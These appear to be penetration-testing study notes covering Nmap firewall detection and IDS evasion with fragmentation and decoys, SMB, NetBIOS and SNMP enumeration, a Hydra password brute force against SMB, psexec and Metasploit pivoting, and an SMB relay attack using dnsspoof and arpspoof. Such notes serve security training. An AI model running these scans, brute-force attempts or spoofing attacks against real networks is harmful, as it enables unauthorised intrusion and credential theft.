
---

### **1. Introduction**

1. Host Discovery & Port Scanning
    
2. Service Enumeration
    
3. MITM & Network-Based Attacks
    
4. Windows Exploitation & Post-Exploitation
    
5. Linux Exploitation & Post-Exploitation
    

---

### **2. Networking**

#### **Networking Fundamentals**

- Already covered in the _Footprinting & Scanning_ section.
    

#### **Firewall Detection & IDS Evasion**

- **Detecting Firewalls with Nmap:**
    
    ```bash
    nmap -Pn -sA -pP1,P2 TargetIP
    ```
    
    - `-sA`: ACK scan. If port appears filtered, likely a stateful firewall is present.
        
- **Evading IDS (Intrusion Detection Systems):**
    
    ```bash
    nmap -Pn -sS -F -f --mtu n TargetIP
    ```
    
    - `-f`: Enables packet fragmentation
        
    - `--mtu`: Set MTU (packet size) for fragmentation
        
- **Spoofing Gateway IP:**
    
    ```bash
    nmap -Pn -sS -sV -pP1,P2 -f --data-length L -D SpoofedIP TargetIP
    ```
    
    - `--data-length`: Adds padding to packets
        
    - `-D`: Decoy IPs for stealth
        

---

### **3. Network Attacks**

#### **Network Enumeration**

- Covered in the _Enumeration_ section.
    

#### **SMB & NetBIOS Enumeration**

- **NetBIOS:** Used for name resolution and basic communication
    
    - Ports: 137 (Name), 138 (Datagram), 139 (Session)
        
- **SMB (Server Message Block):** Used for file/print sharing and IPC
    
    - Versions: SMB1 / SMB2 / SMB3+
        

**NetBIOS/SMB Enumeration Commands:**

```bash
nmap -sU -sV -T4 --script nbstat.nse -pPort TargetIP
nbtscan SubnetIPRange
nmblookup -A TargetIP

nmap -sV -p 139,445 TargetIP
nmap -p445 --script smb-protocols TargetIP
nmap -p445 --script smb-security-mode TargetIP
smbclient -L TargetIP
nmap -p445 --script smb-enum-users TargetIP
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TargetIP smb

psexec.py user@TargetIP
# OR
msf6 > use windows/smb/psexec

meterpreter > run autoroute -s SubnetIP
msf6 > use server/socks_proxy
proxychains nmap TargetIP ...
```

#### **SNMP Enumeration**

- SNMP runs over UDP:
    
    - Ports: 161 (queries), 162 (traps)
        
- Components: SNMP Manager, Agent, and MIB
    
- Enum goals: Identify SNMP-enabled devices, system/network info, community strings, services, users, and groups
    

**SNMP Enumeration Commands:**

```bash
nmap -sU -sV -p 161 --script snmp-* TargetIP > snmp_info
snmpwalk -v 1 -c public TargetIP
```

#### **SMB Relay Attack**

- Exploits relay of SMB authentication to gain access
    
- Steps: Intercept → Capture creds → Relay to server → Gain access
    

**SMB Relay Commands:**

```bash
msf6 > use exploit/windows/smb/smb_relay

echo "TargetIP domain" > dns
sudo dnsspoof -i interface -f dns
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo arpspoof -i interface -t TargetIP gatewayIP
sudo arpspoof -i interface -t gatewayIP TargetIP
```

---
